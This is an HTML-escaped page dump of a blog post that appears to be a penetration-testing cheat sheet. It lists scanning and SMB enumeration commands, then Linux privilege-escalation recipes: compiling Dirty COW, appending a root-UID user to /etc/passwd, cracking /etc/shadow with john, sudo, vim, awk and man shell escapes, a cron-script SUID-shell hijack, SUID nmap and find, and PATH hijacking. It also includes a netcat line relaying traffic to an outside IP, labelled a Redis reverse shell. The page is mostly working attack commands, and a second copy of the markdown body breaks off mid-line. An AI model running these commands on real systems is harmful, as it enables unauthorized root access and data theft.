icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;prevPostItem&quot;:[0,null],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; 